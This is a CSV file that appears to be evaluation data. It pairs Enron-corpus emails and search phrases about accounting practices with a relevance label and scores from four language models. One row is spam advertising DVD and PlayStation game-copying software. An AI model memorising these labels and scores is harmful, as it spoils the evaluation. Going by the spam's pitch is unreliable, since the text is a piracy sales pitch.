search_phrase,label,email,mistral_pred,openhermes_pred,vicuna_pred,gemma_pred
mark to market accounting practices,0,"Subject: RE: Inconsistant Credit AmountsIssue has been resolved. Please disregard. The $500M amount quoted below was eventually changed to $0 and reconfirmed.thanksbrant -----Original Message-----BrantSubject: Inconsistant Credit AmountsGas Producers Liquids Inc. - Omnibus confirmations only - No ISDAHow do we margin this LC customer when the Exposure Thresholds are not consistant across each Annex B? Their financial mark to market exposure is currently $1.3MM.AnnexTradesB-Credit LineQL3281.1$0QL3360.1$0QN8251.1$0QN8251.2$0QQ7096.1$0QQ7109.1$500,000QR4386.1$0QS3259.1$0QS3259.2$25,000Brant",0.0,0.2,0.7,0.2
RANDOM,0,"Subject: Copy Playstaion FREE                   29462


 COPY ANY DVD MOVIE! With our revolutionary software you can copy virtually=
 any DVD Movie using your existing equipment!  Conventional DVD copying equ=
ipment can cost thousands of $$ Our DVD Wizard cost less than the price of =
2 DVD Movies!   Order NOW and get our PlayStation Wizard For FREE!  CLICK H=
ERE To Learn About DVD Wizard!   CONVERT VHS INTO DVD! Why pay for a copy o=
f a movie on DVD that you already  own of VHS???  Not all movies on VHS are=
 available on DVD. So MAKE Them into a DVD yourself!!  DVD Wizard Will teac=
h you. Our Revolutionary DVD Wizard will help you create DVD's!  Copy DVD M=
ovies And Create Your Own Personal Collection! Convert VHS and Camcorder Mo=
vies into DVD Movies!    Order NOW and get our PlayStation Wizard For FREE!=
 . CLICK HERE To Learn About VHS Wizard!    VHS.gif (10098 bytes)  FREE BON=
US!!   COPY PLAYSTATION?FFFFAE GAMES   With our revolutionary software you =
can copy virtually any  PlayStation?FFFFAE Game using your existing CD Burn=
er!    Conventional Game Coping copying equipment can cost thousands of  do=
llars.    The PlayStation ?FFFFAE Wizard costs less than the price of ONE G=
AME!    Rent any game for less than $4 and copy it for FREE!    Save HUNDRE=
DS of dollars copying games! For the price of just one game you can  own th=
is software and have UNLIMITED GAMES!     This means the software pays for =
 itself the first time you use it!!!   Order NOW and get our PlayStation Wi=
zard For FREE!   CLICK HERE To Learn About PlayStation Wizard!     =09",0.0,0.0,0.7,0.0
RANDOM,0,"Subject: Confidentiality Agreement - PETRONAS / ENRON

Fyi:

This is in the works by the LNG guys and is intended to cover release of some 
EnronOnline information.

Dave
---------------------- Forwarded by David Forster/Corp/Enron on 02/23/2001 


V V Rao@ECT
02/23/2001 01:54 AM

Subject: Confidentiality Agreement - PETRONAS / ENRON

fyi
---------------------- Forwarded by V V Rao/SIN/ECT on 23/02/2001 15:49 
---------------------------


Matthias Lee
23/02/2001 15:50
Poon/SIN/ECT@ECT, Matthias Lee/SIN/ECT@ECT 

Subject: Confidentiality Agreement - PETRONAS / ENRON

Clay

Please see below the procedure for execution of the CA which I have agreed 
with Sareen of Petronas.

Please print two copies and sign on both. One copy should be delivered to 
Sareen in exchange for the fax copy executed by Mr Muri Mohammad. The other 
is to be retained by us for our records.

Regards
Matt

---------------------- Forwarded by Matthias Lee/SIN/ECT on 02/23/2001 03:45 
PM ---------------------------


Matthias Lee
02/23/2001 03:47 PM
Harris/ENRON_DEVELOPMENT@ENRON_DEVELOPMENT 

Subject: Re: Comments on the Proposed Enron Confidentiality Agreement - LNG 
ONline  

Dear Sareen

Thank you for the marked up finalised version of the CA to be dated 26 
February 2001. I confirm it is in order and attach herewith a clean version 
incorporating all your amendments. Please note that I have added Clay Harris' 
name and title to the execution clause.

As discussed, since our authorised signatories will be in different places, 
we will execute the CA in counterparts as follows:

1. You will print the attached CA for your Mr Muri Mohammad who will sign 
them on Monday in KL.

2. The signed CA will be faxed to you in London on Monday which you will 
deliver our Mr Clay Harris. 
A copy will also be faxed to me on Monday.

3. You will leave intructions for the original CA signed by Mr Muri Mohammad 
to be couriered to me in Singapore which I should receive by Tuesday. 

4. Our Mr Clay Harris will sign a counterpart CA and will deliver the 
original to you on Monday in exchange for the faxed counterpart signed by Mr 
Muri Mohammad.

My address:
391B Orchard Road #10-03
Ngee Ann City Tower B
Singapore 238874

My Fax : 
(65) 734 2868



Please confirm by return e-mail. Thanks

Matt





sareen@petronas.com.my on 02/23/2001 12:00:06 PM

Subject: Re: Comments on the Proposed Enron Confidentiality Agreement - LNG 
ONline






Dear Matt,

As discussed please find a marked up version of the CA, ",0.0,0.0,0.0,0.0
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Subject: Demand Ken Lay Donate Proceeds from Enron Stock SalesLavergne Schwender9988 Windmill Lakes, 1607Houston, TX 77075To Mr. Ken Lay,I'm writing to urge you to donate the millions of dollars you made from selling Enron stock before the company declared bankruptcy to funds, such as Enron Employee Transition Fund and REACH, that benefit the company's employees, who lost their retirement savings, and provide relief to low-income consumers in California, who can't afford to pay their energy bills. Enron and you made millions out of the pocketbooks of California consumers and from the efforts of your employees.Mr. Lay, your wife said that ""you were devastated"" by the collapse of Enron. Are you ""devasted"" enough to return some of the hundreds of millions you made wheeling and dealing in Enron stock--and your salary! Perhaps from the millions you will receive from your property in Aspen and elsewhere you'll find a few scheckles to do the right thing.Indeed, while you netted well over a $100 million, many of Enron's employees were financially devastated when the company declared bankruptcy and their retirement plans were wiped out. And Enron made an astronomical profit during the California energy crisis last year. As a result, there are thousands of consumers who are unable to pay their basic energy bills and the largest utility in the state is bankrupt.The New York Times reported that you sold $101 million worth of Enron stock while aggressively urging the company's employees to keep buying it. Please donate this money to the funds set up to help repair the lives of those Americans hurt by Enron's underhanded dealings.Sincerely,Lavergne Schwender",0.0,0.0,0.9,0.0
mark to market accounting practices,0,"Subject: New EBS Procedures for Risk Management BooksGood morning-Discussions have taken place between EBS (Barry Pearce) and RAC (David Port) to make adjustments to the EBS daily risk-reporting process. This memo will outline the changes that have been discussed and agreed upon. EBS will implement these changes this week.DPR All risk books will be run on Tuesday and Thursday of each week and P&L will be reported for those days. POSITIONS AND CURVESPending an IT solution, positions and curves will be loaded each day. On days when the books are not run, we will use prior day information. Per discussions with Credit, this process is sufficient for counterparty exposure reporting.CASH FLOWSCash flows will be loaded on days the books are run. Infinity will pick up prior information on days when books are not run._____________________EBS will agree to run books on days when significant changes occur or we are at month-end. Please do not hesitate to call with questions or comments.Thank you,GaryX35502",0.0,0.1,0.7,0.0
RANDOM,0,"Subject: Deposit

Just to confirm from our telephone conversation, I will be depositing 
$8,046.60 Canadian to your TD account.  This is a retroactive payment per 
David Oxley.  I'll forward you the calcuation as well.
Janice",0.0,0.0,0.5,0.0
RANDOM,0,"Subject: Continental Update

SK - I forwarded this to J Brindle. mm


Good day, everyone,

News from Continental regarding the reinforcement of cockpit doors and some
changes to the check-in procedure at George Bush Intercontinental Airport:




CONTINENTAL AND CONTINENTAL EXPRESS 
TO REINFORCE COCKPIT DOORS

HOUSTON, October 3, 2001 -- Continental Airlines (NYSE: CAL) and its
regional air carrier Continental Express (NYSE: CAL) will begin immediate
installation of secondary reinforcing restraints on cockpit doors to enhance
security on their aircraft, pending receipt of Federal Aviation
Administration (FAA) final criteria specifications. With approval, the
airlines plan to complete installation on all of Continental's 341 aircraft
and Continental Express' 160 aircraft within 30 days. 


THE MOVE IS ON
Houston's Paris, London and Tokyo Flights Check-in at Terminal C

What: Terminal change for flight check-in 
Flights affected: Continental flights from Houston to London, Paris and
Tokyo 

Effective October 16, 2001, passengers traveling on Continental from Houston
to London, Paris and Tokyo will check-in at Terminal C in George Bush
Intercontinental Airport (IAH). There will no longer be any passenger
check-in facilities in Terminal D. Moving the check-in of these flights to
Terminal C will streamline operations and help process passengers through
the airport more efficiently. 



Susan Henson

National Sales Manager",0.0,0.0,0.8,0.0
RANDOM,0,"Subject: Preston Exploration, LLC

Ed, I am forwarding this to you since I understand that John Griffith is no 
longer in structuring.  Could you (or Kam, if she's the appropriate party) 
please respond to Joan about sitara deal 555941 (and the corresponding desk 
to desk deal, 555681).  Thanks.

George x3-6992

---------------------- Forwarded by George Weissman/HOU/ECT on 02/06/2001 
Derek Bailey/Corp/Enron@ENRON 
Subject: Preston Exploration, LLC 
St. Mary's Production LLC VPP
 Hunt Oil Company Myette Point Northwest Field
 St. Mary Parish, LA
Contract 96054361
TGT Meters 9437 & 9502


the sitara tic #555941 [Bank of America] should not exist.  there should no 
deal in sitara re BofA.  100% of the VPP vols s/b under the name of Brazos.  
Brazos is buying 100% of the physical gas.  BofA is buying zero.  The sitara 
tics needs to be adjusted so that Brazos is buying 100% of the gas, and BofA 
zero.  Let me know if you need more information.

joan

---------------------- Forwarded by Joan Quick/HOU/ECT on 02/06/2001 10:40 AM 
---------------------------
   
	Enron North America Corp.
	
	

Cook/HOU/ECT@ECT, Robert Crockett/HOU/ECT@ECT, Lia Halstead/NA/Enron@ENRON 
Subject: Preston Exploration, LLC 
St. Mary's Production LLC VPP
 Hunt Oil Company Myette Point Northwest Field
 St. Mary Parish, LA
Contract 96054361
TGT Meters 9437 & 9502

See notations in red below.  George x3-6992

---------------------- Forwarded by George Weissman/HOU/ECT on 02/06/2001 
Subject: St. Mary's FEB First of the Month Nom, Myette Point Northwest Field
 St. Mary Parish, LA


for feb,

VPP gas: sitara tic #541136 shows 11,136/d, when it should really be 11,480/d.

The other 344/d is on sitara tic #555941; the two tickets together total 
11,480/d.  You'll remember that the Bank of America tics were established by 
John Griffith's team.

and re the excess gas tics [below], they do not match my first of the month 
[FOM] info below.  Did the FOM change?  

The nom was in fact changed by Hunt at 2:00 pm on 1/31/2001.  Hunt had 
inadvertantly provided you with North Central's nomination for the low volume 
meter, 9502, instead of Preston's nomination.  Thus, the 2,997/d on the North 
Central page (note the 25% WI on your original documentation - I missed this 
clue also) provided to us on 1/25/2001 became 2,012/d on the Preston page 
provided to us on 1/31/2001.

The GDA tic s/b 10% of the total excess amount, and this is less than that.  
Am I missing something?

The Gas Daily ticket wo",0.5,0.0,0.0,0.2
mark to market accounting practices,0,Subject: Partnership Accounting Services Resource RequirementsPlease see attached. I am available to discuss.,0.0,0.0,0.0,0.0
raptor creation of special purpose entities,0,"Subject: Papers for Raptor Meeting TuesdaySee attached for your review prior to meeting, Tuesday 9:30 38C1. Thanks. MaryEnron North America Corp.Mary Cook1400 Smith, 38th Floor, LegalHouston, Texas 77002-7361(713) 345-7732 (phone)(713) 646-3490 (fax)",0.0,0.0,0.8,0.0
